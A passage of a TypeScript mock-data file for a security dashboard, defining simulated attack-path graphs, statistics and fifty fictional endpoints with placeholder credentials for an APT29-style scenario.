Nmap scan report for 10.10.2.39 (SIEM-30)
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap done: 254 IP addresses (29 hosts up) scanned in 34.7 seconds`,
    },
  ],
  attack_path_edges:[
    {edge_id:'s530EP-c01',edge_source:'s530EP-a01',edge_target:'s530EP-a02',edge_type:'chain_flow', edge_label:'foothold → lateral'},
    {edge_id:'s530EP-c02',edge_source:'s530EP-a02',edge_target:'s530EP-a03',edge_type:'chain_flow'},
    {edge_id:'s530EP-c03',edge_source:'s530EP-a03',edge_target:'s530EP-a04',edge_type:'chain_flow'},
    {edge_id:'s530EP-c04',edge_source:'s530EP-a04',edge_target:'s530EP-a05',edge_type:'chain_flow'},
    {edge_id:'s530EP-c05',edge_source:'s530EP-a05',edge_target:'s530EP-a06',edge_type:'chain_flow'},
    {edge_id:'s530EP-c06',edge_source:'s530EP-a06',edge_target:'s530EP-a07',edge_type:'chain_flow'},
    {edge_id:'s530EP-c07',edge_source:'s530EP-a07',edge_target:'s530EP-a08',edge_type:'chain_flow'},
    {edge_id:'s530EP-c08',edge_source:'s530EP-a08',edge_target:'s530EP-a09',edge_type:'chain_flow'},
    {edge_id:'s530EP-c09',edge_source:'s530EP-a09',edge_target:'s530EP-a10',edge_type:'chain_flow'},
    {edge_id:'s530EP-c10',edge_source:'s530EP-a10',edge_target:'s530EP-a11',edge_type:'chain_flow'},
    {edge_id:'s530EP-c11',edge_source:'s530EP-a11',edge_target:'s530EP-a12',edge_type:'chain_flow'},
    {edge_id:'s530EP-c12',edge_source:'s530EP-a12',edge_target:'s530EP-a13',edge_type:'chain_flow'},
    {edge_id:'s530EP-c13',edge_source:'s530EP-a13',edge_target:'s530EP-a14',edge_type:'chain_flow'},
    {edge_id:'s530EP-c14',edge_source:'s530EP-a14',edge_target:'s530EP-a15',edge_type:'chain_flow'},
    {edge_id:'s530EP-c15',edge_source:'s530EP-a15',edge_target:'s530EP-a16',edge_type:'chain_flow'},
    {edge_id:'s530EP-c16',edge_source:'s530EP-a16',edge_target:'s530EP-a17',edge_type:'chain_flow'},
    {edge_id:'s530EP-c17',edge_source:'s530EP-a17',edge_target:'s530EP-a18',edge_type:'chain_flow'},
    {edge_id:'s530EP-c18',edge_source:'s530EP-a18',edge_target:'s530EP-a19',edge_type:'chain_flow'},
    {edge_id:'s530EP-c19',edge_source:'s530EP-a19',edge_target:'s530EP-a20',edge_type:'chain_flow'},
    {edge_id:'s530EP-c20',edge_source:'s530EP-a20',edge_target:'s530EP-a21',edge_type:'chain_flow'},
    {edge_id:'s530EP-c21',edge_source:'s530EP-a21',edge_target:'s530EP-a22',edge_type:'chain_flow'},
    {edge_id:'s530EP-c22',edge_source:'s530EP-a22',edge_target:'s530EP-a23',edge_type:'chain_flow'},
    {edge_id:'s530EP-c23',edge_source:'s530EP-a23',edge_target:'s530EP-a24',edge_type:'chain_flow'},
    {edge_id:'s530EP-c24',edge_source:'s530EP-a24',edge_target:'s530EP-a25',edge_type:'chain_flow'},
    {edge_id:'s530EP-c25',edge_source:'s530EP-a25',edge_target:'s530EP-a26',edge_type:'chain_flow'},
    {edge_id:'s530EP-c26',edge_source:'s530EP-a26',edge_target:'s530EP-a27',edge_type:'chain_flow'},
    {edge_id:'s530EP-c27',edge_source:'s530EP-a27',edge_target:'s530EP-a28',edge_type:'chain_flow'},
    {edge_id:'s530EP-c28',edge_source:'s530EP-a28',edge_target:'s530EP-a29',edge_type:'chain_flow'},
    {edge_id:'s530EP-c29',edge_source:'s530EP-a29',edge_target:'s530EP-a30',edge_type:'chain_flow'},
    {edge_id:'s530EP-al01',edge_source:'s530EP-a01',edge_target:'s530EP-ep01',edge_type:'asset_link'},
    {edge_id:'s530EP-al02',edge_source:'s530EP-a02',edge_target:'s530EP-ep02',edge_type:'asset_link'},
    {edge_id:'s530EP-al03',edge_source:'s530EP-a03',edge_target:'s530EP-ep03',edge_type:'asset_link'},
    {edge_id:'s530EP-al04',edge_source:'s530EP-a04',edge_target:'s530EP-ep04',edge_type:'asset_link'},
    {edge_id:'s530EP-al05',edge_source:'s530EP-a05',edge_target:'s530EP-ep05',edge_type:'asset_link'},
    {edge_id:'s530EP-al06',edge_source:'s530EP-a06',edge_target:'s530EP-ep06',edge_type:'asset_link'},
    {edge_id:'s530EP-al07',edge_source:'s530EP-a07',edge_target:'s530EP-ep07',edge_type:'asset_link'},
    {edge_id:'s530EP-al08',edge_source:'s530EP-a08',edge_target:'s530EP-ep08',edge_type:'asset_link'},
    {edge_id:'s530EP-al09',edge_source:'s530EP-a09',edge_target:'s530EP-ep09',edge_type:'asset_link'},
    {edge_id:'s530EP-al10',edge_source:'s530EP-a10',edge_target:'s530EP-ep10',edge_type:'asset_link'},
    {edge_id:'s530EP-al11',edge_source:'s530EP-a11',edge_target:'s530EP-ep11',edge_type:'asset_link'},
    {edge_id:'s530EP-al12',edge_source:'s530EP-a12',edge_target:'s530EP-ep12',edge_type:'asset_link'},
    {edge_id:'s530EP-al13',edge_source:'s530EP-a13',edge_target:'s530EP-ep13',edge_type:'asset_link'},
    {edge_id:'s530EP-al14',edge_source:'s530EP-a14',edge_target:'s530EP-ep14',edge_type:'asset_link'},
    {edge_id:'s530EP-al15',edge_source:'s530EP-a15',edge_target:'s530EP-ep15',edge_type:'asset_link'},
    {edge_id:'s530EP-al16',edge_source:'s530EP-a16',edge_target:'s530EP-ep16',edge_type:'asset_link'},
    {edge_id:'s530EP-al17',edge_source:'s530EP-a17',edge_target:'s530EP-ep17',edge_type:'asset_link'},
    {edge_id:'s530EP-al18',edge_source:'s530EP-a18',edge_target:'s530EP-ep18',edge_type:'asset_link'},
    {edge_id:'s530EP-al19',edge_source:'s530EP-a19',edge_target:'s530EP-ep19',edge_type:'asset_link'},
    {edge_id:'s530EP-al20',edge_source:'s530EP-a20',edge_target:'s530EP-ep20',edge_type:'asset_link'},
    {edge_id:'s530EP-al21',edge_source:'s530EP-a21',edge_target:'s530EP-ep21',edge_type:'asset_link'},
    {edge_id:'s530EP-al22',edge_source:'s530EP-a22',edge_target:'s530EP-ep22',edge_type:'asset_link'},
    {edge_id:'s530EP-al23',edge_source:'s530EP-a23',edge_target:'s530EP-ep23',edge_type:'asset_link'},
    {edge_id:'s530EP-al24',edge_source:'s530EP-a24',edge_target:'s530EP-ep24',edge_type:'asset_link'},
    {edge_id:'s530EP-al25',edge_source:'s530EP-a25',edge_target:'s530EP-ep25',edge_type:'asset_link'},
    {edge_id:'s530EP-al26',edge_source:'s530EP-a26',edge_target:'s530EP-ep26',edge_type:'asset_link'},
    {edge_id:'s530EP-al27',edge_source:'s530EP-a27',edge_target:'s530EP-ep27',edge_type:'asset_link'},
    {edge_id:'s530EP-al28',edge_source:'s530EP-a28',edge_target:'s530EP-ep28',edge_type:'asset_link'},
    {edge_id:'s530EP-al29',edge_source:'s530EP-a29',edge_target:'s530EP-ep29',edge_type:'asset_link'},
    {edge_id:'s530EP-al30',edge_source:'s530EP-a30',edge_target:'s530EP-ep30',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep02',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep02',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep03',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep03',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep04',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep04',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep05',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep05',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep06',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep06',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep07',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep07',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep08',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep08',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep09',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep09',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep10',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep10',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep11',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep11',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep12',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep12',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep13',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep13',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep14',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep14',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep15',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep15',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep16',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep16',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep17',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep17',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep18',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep18',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep19',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep19',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep20',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep20',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep21',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep21',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep22',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep22',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep23',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep23',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep24',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep24',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep25',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep25',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep26',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep26',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep27',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep27',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep28',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep28',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep29',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep29',edge_type:'asset_link'},
    {edge_id:'s530EP-nmap-ep30',edge_source:'s530EP-a-nmap-bulk',edge_target:'s530EP-ep30',edge_type:'asset_link'},
  ],
  attack_path_stats:{
    stats_prevented:3,stats_detected:6,stats_undetected:21,
    stats_pending:0,stats_total_actions:31,stats_executed_actions:31,
    stats_captured_endpoints:14,stats_captured_files:27,stats_captured_credentials:27,
stats_captured_users: 19,
stats_captured_cves: 12,
  },
  attack_path_definitions:[
    {path_id:'s530EP-p1',path_name:'Main Compromise Chain',path_color:'#e91e63',node_ids:['s530EP-ep01','s530EP-ep02','s530EP-ep03','s530EP-ep05','s530EP-ep11','s530EP-ep14','s530EP-ep15','s530EP-ep16','s530EP-ep17','s530EP-ep22','s530EP-ep23','s530EP-ep26','s530EP-ep27','s530EP-ep30'],path_outcome:'success'},
    {path_id:'s530EP-p2',path_name:'Cross-Zone Lateral Path',path_color:'#ff9800',node_ids:['s530EP-ep01','s530EP-ep06','s530EP-ep07','s530EP-ep08','s530EP-ep12','s530EP-ep13','s530EP-ep24'],path_outcome:'success'},
    {path_id:'s530EP-p3',path_name:'Blocked Attempt',path_color:'#9c27b0',node_ids:['s530EP-ep01','s530EP-ep09','s530EP-ep10','s530EP-ep21'],path_outcome:'failed', path_fail_reason:'PREVENTED by security control', failed_from_node_id:'s530EP-ep21'},
  ],
};
// ══════════════════════════════════════════════════════════════
// APT29 Scale — 50 Endpoints, 4 zones
// ══════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_APT_50EP: AttackPathData = {
  attack_path_nodes: [
    { node_id:'s550EP-ep01', node_type:'ASSET', node_label:'WEB-01', node_hostname:'WEB-01',
      node_ip:'172.16.0.10', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_entry_point:true,
      node_accessed_files:['C:\\Logs\\WEB-01-audit.log'],
      node_credentials_found:['CORP\\web01:P@ss01!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep02', node_type:'ASSET', node_label:'APP-02', node_hostname:'APP-02',
      node_ip:'172.16.0.11', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-02-audit.log'],
      node_credentials_found:['CORP\\app02:P@ss02!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep03', node_type:'ASSET', node_label:'DB-03', node_hostname:'DB-03',
      node_ip:'172.16.0.12', node_platform:'CentOS 7', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DB-03-audit.log'],
      node_credentials_found:['CORP\\db03:P@ss03!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep04', node_type:'ASSET', node_label:'FILE-04', node_hostname:'FILE-04',
      node_ip:'172.16.0.13', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep05', node_type:'ASSET', node_label:'MAIL-05', node_hostname:'MAIL-05',
      node_ip:'172.16.0.14', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
      node_credentials_found:['CORP\\mail05:P@ss05!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s550EP-ep06', node_type:'ASSET', node_label:'JUMP-06', node_hostname:'JUMP-06',
      node_ip:'172.16.0.15', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
      node_credentials_found:['CORP\\jump06:P@ss06!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep07', node_type:'ASSET', node_label:'PRINT-07', node_hostname:'PRINT-07',
      node_ip:'172.16.0.16', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\PRINT-07-audit.log'],
      node_credentials_found:['CORP\\print07:P@ss07!'],
    node_agents:['openaev'],
    },
    { node_id:'s550EP-ep08', node_type:'ASSET', node_label:'DNS-08', node_hostname:'DNS-08',
      node_ip:'172.16.0.17', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
      node_credentials_found:['CORP\\dns08:P@ss08!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep09', node_type:'ASSET', node_label:'DC-09', node_hostname:'DC-09',
      node_ip:'172.16.0.18', node_platform:'Ubuntu 20.04 LTS', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\DC-09-audit.log'],
      node_credentials_found:['CORP\\dc09:P@ss09!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s550EP-ep10', node_type:'ASSET', node_label:'WS-10', node_hostname:'WS-10',
      node_ip:'172.16.0.19', node_platform:'CentOS 7', node_status:'detected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['openaev'],
    },
    { node_id:'s550EP-ep11', node_type:'ASSET', node_label:'API-11', node_hostname:'API-11',
      node_ip:'172.16.0.20', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_accessed_files:['C:\\Logs\\API-11-audit.log'],
      node_credentials_found:['CORP\\api11:P@ss11!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep12', node_type:'ASSET', node_label:'BACKUP-12', node_hostname:'BACKUP-12',
      node_ip:'172.16.0.21', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep13', node_type:'ASSET', node_label:'MONITOR-13', node_hostname:'MONITOR-13',
      node_ip:'172.16.0.22', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'External DMZ', node_subnet:'172.16.0.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep14', node_type:'ASSET', node_label:'VPN-14', node_hostname:'VPN-14',
      node_ip:'10.10.1.63', node_platform:'Windows 10', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\VPN-14-audit.log'],
      node_credentials_found:['CORP\\vpn14:P@ss14!'],
    node_agents:['openaev'],
    },
    { node_id:'s550EP-ep15', node_type:'ASSET', node_label:'SIEM-15', node_hostname:'SIEM-15',
      node_ip:'10.10.1.64', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep16', node_type:'ASSET', node_label:'WEB-16', node_hostname:'WEB-16',
      node_ip:'10.10.1.65', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WEB-16-audit.log'],
      node_credentials_found:['CORP\\web16:P@ss16!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep17', node_type:'ASSET', node_label:'APP-17', node_hostname:'APP-17',
      node_ip:'10.10.1.66', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-17-audit.log'],
      node_credentials_found:['CORP\\app17:P@ss17!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep18', node_type:'ASSET', node_label:'DB-18', node_hostname:'DB-18',
      node_ip:'10.10.1.67', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep19', node_type:'ASSET', node_label:'FILE-19', node_hostname:'FILE-19',
      node_ip:'10.10.1.68', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\FILE-19-audit.log'],
      node_credentials_found:['CORP\\file19:P@ss19!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep20', node_type:'ASSET', node_label:'MAIL-20', node_hostname:'MAIL-20',
      node_ip:'10.10.1.69', node_platform:'CentOS 7', node_status:'detected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s550EP-ep21', node_type:'ASSET', node_label:'JUMP-21', node_hostname:'JUMP-21',
      node_ip:'10.10.1.70', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s550EP-ep22', node_type:'ASSET', node_label:'PRINT-22', node_hostname:'PRINT-22',
      node_ip:'10.10.1.71', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\PRINT-22-audit.log'],
      node_credentials_found:['CORP\\print22:P@ss22!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s550EP-ep23', node_type:'ASSET', node_label:'DNS-23', node_hostname:'DNS-23',
      node_ip:'10.10.1.72', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
      node_accessed_files:['C:\\Logs\\DNS-23-audit.log'],
      node_credentials_found:['CORP\\dns23:P@ss23!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep24', node_type:'ASSET', node_label:'DC-24', node_hostname:'DC-24',
      node_ip:'10.10.1.73', node_platform:'Red Hat 8', node_status:'prevented',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep25', node_type:'ASSET', node_label:'WS-25', node_hostname:'WS-25',
      node_ip:'10.10.1.74', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Corp LAN', node_subnet:'10.10.1.0/24',
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep26', node_type:'ASSET', node_label:'API-26', node_hostname:'API-26',
      node_ip:'10.10.2.35', node_platform:'Windows Server 2019', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\API-26-audit.log'],
      node_credentials_found:['CORP\\api26:P@ss26!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep27', node_type:'ASSET', node_label:'BACKUP-27', node_hostname:'BACKUP-27',
      node_ip:'10.10.2.36', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\BACKUP-27-audit.log'],
      node_credentials_found:['CORP\\backup27:P@ss27!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep28', node_type:'ASSET', node_label:'MONITOR-28', node_hostname:'MONITOR-28',
      node_ip:'10.10.2.37', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep29', node_type:'ASSET', node_label:'VPN-29', node_hostname:'VPN-29',
      node_ip:'10.10.2.38', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep30', node_type:'ASSET', node_label:'SIEM-30', node_hostname:'SIEM-30',
      node_ip:'10.10.2.39', node_platform:'CentOS 7', node_status:'prevented',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep31', node_type:'ASSET', node_label:'WEB-31', node_hostname:'WEB-31',
      node_ip:'10.10.2.40', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\WEB-31-audit.log'],
      node_credentials_found:['CORP\\web31:P@ss31!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep32', node_type:'ASSET', node_label:'APP-32', node_hostname:'APP-32',
      node_ip:'10.10.2.41', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-32-audit.log'],
      node_credentials_found:['CORP\\app32:P@ss32!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep33', node_type:'ASSET', node_label:'DB-33', node_hostname:'DB-33',
      node_ip:'10.10.2.42', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\DB-33-audit.log'],
      node_credentials_found:['CORP\\db33:P@ss33!'],
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep34', node_type:'ASSET', node_label:'FILE-34', node_hostname:'FILE-34',
      node_ip:'10.10.2.43', node_platform:'Ubuntu 22.04 LTS', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\FILE-34-audit.log'],
      node_credentials_found:['CORP\\file34:P@ss34!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s550EP-ep35', node_type:'ASSET', node_label:'MAIL-35', node_hostname:'MAIL-35',
      node_ip:'10.10.2.44', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MAIL-35-audit.log'],
      node_credentials_found:['CORP\\mail35:P@ss35!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep36', node_type:'ASSET', node_label:'JUMP-36', node_hostname:'JUMP-36',
      node_ip:'10.10.2.45', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep37', node_type:'ASSET', node_label:'PRINT-37', node_hostname:'PRINT-37',
      node_ip:'10.10.2.46', node_platform:'CentOS 7', node_status:'prevented',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
    node_agents:['palo_alto', 'openaev'],
    },
    { node_id:'s550EP-ep38', node_type:'ASSET', node_label:'DNS-38', node_hostname:'DNS-38',
      node_ip:'10.10.2.47', node_platform:'Windows 10', node_status:'detected',
      node_zone:'Server Farm', node_subnet:'10.10.2.0/24',
      node_accessed_files:['C:\\Logs\\DNS-38-audit.log'],
      node_credentials_found:['CORP\\dns38:P@ss38!'],
    node_agents:['palo_alto', 'sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep39', node_type:'ASSET', node_label:'DC-39', node_hostname:'DC-39',
      node_ip:'10.10.3.48', node_platform:'CentOS 7', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\DC-39-audit.log'],
      node_credentials_found:['CORP\\dc39:P@ss39!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s550EP-ep40', node_type:'ASSET', node_label:'WS-40', node_hostname:'WS-40',
      node_ip:'10.10.3.49', node_platform:'Windows 11', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep41', node_type:'ASSET', node_label:'API-41', node_hostname:'API-41',
      node_ip:'10.10.3.50', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\API-41-audit.log'],
      node_credentials_found:['CORP\\api41:P@ss41!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep42', node_type:'ASSET', node_label:'BACKUP-42', node_hostname:'BACKUP-42',
      node_ip:'10.10.3.51', node_platform:'Red Hat 8', node_status:'prevented',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['sentinel_one'],
    },
    { node_id:'s550EP-ep43', node_type:'ASSET', node_label:'MONITOR-43', node_hostname:'MONITOR-43',
      node_ip:'10.10.3.52', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\MONITOR-43-audit.log'],
      node_credentials_found:['CORP\\monitor43:P@ss43!'],
    node_agents:['palo_alto', 'sentinel_one'],
    },
    { node_id:'s550EP-ep44', node_type:'ASSET', node_label:'VPN-44', node_hostname:'VPN-44',
      node_ip:'10.10.3.53', node_platform:'Windows 11', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep45', node_type:'ASSET', node_label:'SIEM-45', node_hostname:'SIEM-45',
      node_ip:'10.10.3.54', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_accessed_files:['C:\\Logs\\SIEM-45-audit.log'],
      node_credentials_found:['CORP\\siem45:P@ss45!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s550EP-ep46', node_type:'ASSET', node_label:'WEB-46', node_hostname:'WEB-46',
      node_ip:'10.10.3.55', node_platform:'Red Hat 8', node_status:'detected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WEB-46-audit.log'],
      node_credentials_found:['CORP\\web46:P@ss46!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s550EP-ep47', node_type:'ASSET', node_label:'APP-47', node_hostname:'APP-47',
      node_ip:'10.10.3.56', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'Restricted Net', node_subnet:'10.10.3.0/24',
